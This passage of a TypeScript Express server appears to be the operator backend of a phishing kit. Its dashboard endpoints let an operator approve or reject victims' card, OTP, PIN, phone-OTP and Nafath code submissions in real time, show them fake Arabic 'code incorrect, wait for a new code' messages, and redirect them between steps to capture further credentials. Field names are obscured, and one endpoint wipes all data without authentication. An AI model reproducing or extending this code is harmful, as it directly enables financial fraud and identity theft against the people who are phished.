      res.json({ success: true, pinSent: true });
    } catch (error) {
      console.error("send pin error", error);
      res.status(500).json({ error: "Failed to send PIN" });
    }
  });

  // PIN Verification Approval/Rejection (Step3Page)
  app.post("/api/dashboard/pin-action", async (req, res) => {
    try {
      const { visitorId, action } = req.body;
      
      if (!visitorId || !action) {
        res.status(400).json({ error: "Missing visitorId or action" });
        return;
      }

      const currentVisitor = await readVisitor(visitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      const updateData: Record<string, any> = {
        pinActionAt: new Date().toISOString(),
        adminPinAction: action,
      };

      if (action === "approved") {
        updateData._v6Status = "approved";
        updateData.paymentStatus = "pin_approved";
        updateData.oneTimeRedirect = "step5"; // Redirect to phone verification
        updateData.currentStep = "_t5";
        updateData.currentPage = "phone";
      } else if (action === "rejected") {
        updateData._v6Status = "rejected";
        updateData.paymentStatus = "pin_rejected";
        updateData.pinRejectionMessage = "رمز PIN غير صحيح - يرجى المحاولة مرة أخرى";
        updateData.pinRejectionAt = new Date().toISOString();
        updateData.currentPage = "step3";
        updateData.currentStep = 6;
      }

      // Update visitor data so customer can receive the update
      await upsertVisitor(visitorId, updateData);
      
      // Preserve all existing visitor data for dashboard
      const dashboardData = await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData, 
        updated: "تم التحديث الآن" 
      }, { preserveTimestamp: true });

      // Broadcast to dashboard immediately
      broadcastToDashboard("dashboard:update", dashboardData);

      res.json({ success: true, action });
    } catch (error) {
      console.error("pin action error", error);
      res.status(500).json({ error: "Failed to process PIN action" });
    }
  });

  // Phone Verification Approval/Rejection (Step5Page)
  app.post("/api/dashboard/phone-action", async (req, res) => {
    try {
      const body = req.body || {};
      const resolvedVisitorId = String(
        body.visitorId || body.id || body.visitor || body.raw?.visitorId || body.raw?.id || ""
      ).trim();
      const action = body.action;
      if (!resolvedVisitorId || !action) {
        res.status(400).json({ error: "Missing visitorId or action" });
        return;
      }

      // Get current visitor data FIRST to preserve all data
      const currentVisitor = await readVisitor(resolvedVisitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
      const currentPage = currentVisitor?.currentPage || "phone";
      const currentStep = currentVisitor?.currentStep || 7;

      const updateData: Record<string, any> = {
        phoneActionAt: new Date().toISOString(),
        adminPhoneAction: action,
        currentPage,
        currentStep,
      };

      if (action === "approved") {
        // APPROVE: redirect to step4 (nafad page)
        updateData.phoneOtpStatus = "approved";
        updateData.phoneRejectionMessage = null;
        updateData.phoneResendRequested = null;
        updateData.oneTimeRedirect = "step4"; // One-time redirect to nafad
        updateData.currentStep = "_t4"; // step4
        updateData.currentPage = "step4";
      } else if (action === "rejected") {
        // REJECT: send back to step5 to re-enter phone number
        updateData.phoneOtpStatus = "rejected";
        updateData.phoneRejectionMessage = "رقم الهاتف غير صحيح - يرجى إدخال بيانات جديدة";
        updateData.phoneRejectionAt = new Date().toISOString();
        updateData.phoneResendRequested = null;
        updateData._v7 = null; // Clear OTP code
        updateData.phoneOtpSubmittedAt = null;
        updateData.currentPage = "step5";
        updateData.currentStep = 5;
        updateData.oneTimeRedirect = "step5"; // Send back to step5
      } else if (action === "resend") {
        // RESEND: open OTP dialog with error message
        updateData.phoneResendRequested = true;
        updateData.phoneResendAt = new Date().toISOString();
        updateData.phoneRejectionMessage = "رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد";
        // Clear the OTP code so customer can enter new one
        updateData._v7 = null;
        updateData.phoneOtpSubmittedAt = null;
        updateData.currentPage = "step5";
        updateData.currentStep = 5;
      }

      // Update visitor data so customer can receive the update
      await upsertVisitor(resolvedVisitorId, updateData);
      
      // Preserve all existing visitor data for dashboard
      const dashboardData = await upsertDashboardRequest({ 
        id: resolvedVisitorId,
        visitorId: resolvedVisitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData,
        updated: "تم التحديث الآن"
      }, { preserveTimestamp: true });

      // Broadcast to dashboard immediately
      broadcastToDashboard("dashboard:update", dashboardData);
      broadcastSSE("visitor-update", { visitorId: resolvedVisitorId, action, updateData, dashboardData });

      res.json({ success: true, action, visitorId: resolvedVisitorId, updateData });
    } catch (error) {
      console.error("phone action error", error);
      res.status(500).json({ error: "Failed to process phone action" });
    }
  });

  // Nafad Confirmation Code Sending (Step4Page - Admin sends 00 code)
  app.post("/api/dashboard/send-nafad-code", async (req, res) => {
    try {
      const { visitorId, nafadCode } = req.body;
      if (!visitorId) {
        res.status(400).json({ error: "Missing visitorId" });
        return;
      }

      const currentVisitor = await readVisitor(visitorId);
      const currentPage = currentVisitor?.currentPage || "nafad";
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      // Keep all existing nafad data and add new code
      const updateData: Record<string, any> = {
        adminNafadCodeSent: true,
        adminNafadSentAt: new Date().toISOString(),
        currentPage,
      };

      if (nafadCode) {
        updateData.adminNafadCode = nafadCode;
      }

      // Update visitor data
      await upsertVisitor(visitorId, updateData);
      
      // Preserve all existing visitor data for dashboard
      const dashboardData = await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData, 
        updated: "تم إرسال رمز النفاذ" 
      }, { preserveTimestamp: true });

      // Broadcast to dashboard
      broadcastToDashboard("dashboard:update", dashboardData);

      res.json({ success: true, codeSent: true });
    } catch (error) {
      console.error("send nafad code error", error);
      res.status(500).json({ error: "Failed to send nafad code" });
    }
  });

  // Reject Action - Admin rejects with error message (keeps customer on same page)
  app.post("/api/dashboard/reject", async (req, res) => {
    try {
      const { visitorId, targetPage, errorMessage } = req.body;
      if (!visitorId || !targetPage) {
        res.status(400).json({ error: "Missing visitorId or targetPage" });
        return;
      }

      console.log("[Dashboard Reject] visitorId:", visitorId, "targetPage:", targetPage, "errorMessage:", errorMessage);
      
      const currentVisitor = await readVisitor(visitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      // Update statuses based on target page
      const updateData: Record<string, any> = {
        rejectionAt: new Date().toISOString(),
        rejectionMessage: errorMessage || "حدث خطأ",
        currentPage: targetPage,
      };

      // Set status based on page
      if (targetPage === "check") {
        updateData._v1Status = "rejected";
        updateData.cardRejectionMessage = errorMessage;
        updateData.cardRejectionAt = new Date().toISOString();
      } else if (targetPage === "step2") {
        updateData._v5Status = "rejected";
        updateData.otpRejectionMessage = errorMessage;
        updateData.otpRejectionAt = new Date().toISOString();
      } else if (targetPage === "step3") {
        updateData._v6Status = "rejected";
        updateData.pinRejectionMessage = errorMessage;
        updateData.pinRejectionAt = new Date().toISOString();
      } else if (targetPage === "step5") {
        updateData.phoneOtpStatus = "rejected";
        updateData.phoneRejectionMessage = errorMessage;
        updateData.phoneRejectionAt = new Date().toISOString();
      }

      await upsertVisitor(visitorId, updateData);

      // Preserve all existing visitor data for dashboard
      const dashboardData = await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData, 
        updated: `تم الرفض: ${errorMessage}` 
      }, { preserveTimestamp: true });

      broadcastToDashboard("dashboard:update", dashboardData);

      // Broadcast to visitor page for real-time update
      if (targetPage === "step2") {
        broadcastToVisitor(visitorId, "_v5Status", "rejected");
      } else if (targetPage === "step3") {
        broadcastToVisitor(visitorId, "_v6Status", "rejected");
      } else if (targetPage === "step5") {
        broadcastToVisitor(visitorId, "phoneOtpStatus", "rejected");
      } else if (targetPage === "check") {
        broadcastToVisitor(visitorId, "_v1Status", "rejected");
      }

      res.json({ success: true, rejected: true, targetPage });
    } catch (error) {
      console.error("reject error", error);
      res.status(500).json({ error: "Failed to reject customer" });
    }
  });

  // Resend Code - Admin resends OTP code to customer
  app.post("/api/dashboard/resend-code", async (req, res) => {
    try {
      const { visitorId, targetPage, errorMessage } = req.body;
      if (!visitorId) {
        res.status(400).json({ error: "Missing visitorId" });
        return;
      }

      console.log("[Dashboard Resend] visitorId:", visitorId, "targetPage:", targetPage, "errorMessage:", errorMessage);
      
      const currentVisitor = await readVisitor(visitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";

      const updateData: Record<string, any> = {
        resendRequestedAt: new Date().toISOString(),
        resendErrorMessage: errorMessage || "رمز التحقق غير صحيح او منتهي الصلاحية يرجى انتظار رمز جديد",
        currentPage: targetPage || "step5",
        // Clear previous OTP
        phoneOtpStatus: null,
        _v7: null,
      };

      await upsertVisitor(visitorId, updateData);

      // Preserve all existing visitor data for dashboard
      const dashboardData = await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        ...currentVisitor,
        ...updateData, 
        updated: "تم إعادة إرسال الرمز" 
      }, { preserveTimestamp: true });

      broadcastToDashboard("dashboard:update", dashboardData);

      res.json({ success: true, resend: true });
    } catch (error) {
      console.error("resend code error", error);
      res.status(500).json({ error: "Failed to resend code" });
    }
  });

  // Manual Redirect - Admin redirects customer to any page
  app.post("/api/dashboard/redirect", async (req, res) => {
    try {
      const { visitorId, targetPage, setNafadVerifying, timestampField: clientTimestampField } = req.body;
      if (!visitorId || !targetPage) {
        res.status(400).json({ error: "Missing visitorId or targetPage" });
        return;
      }

      console.log("[Dashboard Redirect] visitorId:", visitorId, "targetPage:", targetPage, "setNafadVerifying:", setNafadVerifying, "timestampField:", clientTimestampField);
      
      const currentVisitor = await readVisitor(visitorId);
      const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
      const now = new Date().toISOString();

      // DO NOT update timestamps on redirect - this preserves button hiding state
      // Only update redirect-related fields

      // Clear ALL previous statuses and set one-time redirect
      // Keep phoneOtpStatus if it was approved (don't clear approved status)
      const keepPhoneOtpStatus = currentVisitor?.phoneOtpStatus === 'approved';
      
      const updateData: Record<string, any> = {
        adminRedirectPage: targetPage,
        adminRedirectAt: now,
        oneTimeRedirect: targetPage, // One-time redirect flag
        currentPage: targetPage,
        // Clear all previous statuses EXCEPT approved phoneOtpStatus
        phoneRejectionMessage: null,
        phoneResendRequested: null,
        _v7: null,
        adminNafadCode: null,
        nafadConfirmationStatus: null,
        _v1Status: null,
        _v5Status: null,
        _v6Status: null,
      };
      
      // Don't clear phoneOtpStatus if it was approved
      if (!keepPhoneOtpStatus) {
        updateData.phoneOtpStatus = null;
      } else {
        console.log("[Dashboard Redirect] Keeping approved phoneOtpStatus");
      }

      // If nafad-otp redirect, set nafadStatus to verifying to show popup immediately
      if (setNafadVerifying) {
        updateData.nafadStatus = "verifying";
        console.log("[Dashboard Redirect] Setting nafadStatus to verifying for popup");
      }

      console.log("[Dashboard Redirect] Saving updateData:", updateData);
      await upsertVisitor(visitorId, updateData);

      // Preserve all existing visitor data for dashboard with updated timestamps
      const dashboardData = await upsertDashboardRequest({ 
        id: visitorId, 
        visitorId: visitorId,
        customer: customerName,
        // Include all existing data from visitor
        ...currentVisitor,
        // Override with new update data
        ...updateData, 
        updated: `تم التوجيه إلى: ${targetPage}`,
        // Explicitly include the raw data with updated status
        raw: {
          ...(currentVisitor?.raw || currentVisitor || {}),
          ...updateData,
        }
      });

      broadcastToDashboard("dashboard:update", dashboardData);

      res.json({ success: true, redirected: true, targetPage, timestamp: now });
    } catch (error) {
      console.error("redirect error", error);
      res.status(500).json({ error: "Failed to redirect customer" });
    }
  });

  // Serve static files from dist/public in production
  const staticPath =
    process.env.NODE_ENV === "production"
      ? path.resolve(__dirname, "public")
      : path.resolve(__dirname, "..", "dist", "public");

  const builtIndexPath = path.join(staticPath, "index.html");
  const builtIndexExists = fs.existsSync(builtIndexPath);

  // Only use source fallback in development
  const isDevelopment = process.env.NODE_ENV !== "production";
  const fallbackIndexPath = path.resolve(__dirname, "..", "client", "index.html");
  const useFallback = isDevelopment && fs.existsSync(fallbackIndexPath);

  if (useFallback) {
    app.get("/", (_req, res) => {
      res.sendFile(fallbackIndexPath);
    });
  } else if (builtIndexExists) {
    app.get("/", (_req, res) => {
      res.sendFile(builtIndexPath);
    });
  }

  app.use(express.static(staticPath));

  // Handle client-side routing - serve index.html for all routes
  app.get("*", (_req, res) => {
    if (useFallback && fs.existsSync(fallbackIndexPath)) {
      res.sendFile(fallbackIndexPath);
      return;
    }
    res.sendFile(builtIndexPath);
  });

  // TEMP ENDPOINT: Delete all data from database (for testing)
  app.post("/api/admin/delete-all-data", async (_req, res) => {
    try {
      await pool.query("DELETE FROM dashboard_requests");
      await pool.query("DELETE FROM visitors");
      
      // Reset sequences
      await pool.query("ALTER SEQUENCE visitors_id_seq RESTART WITH 1");
      await pool.query("ALTER SEQUENCE dashboard_requests_id_seq RESTART WITH 1");
      
      res.json({ success: true, message: "All data deleted" });
    } catch (error) {
      console.error("Delete error:", error);
      res.status(500).json({ error: "Failed to delete data" });
    }
  });

  const port = process.env.PORT || 3002;

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
    console.log(`Dashboard available at http://localhost:${port}/dashboard`);
  });
}

startServer().catch(console.error);
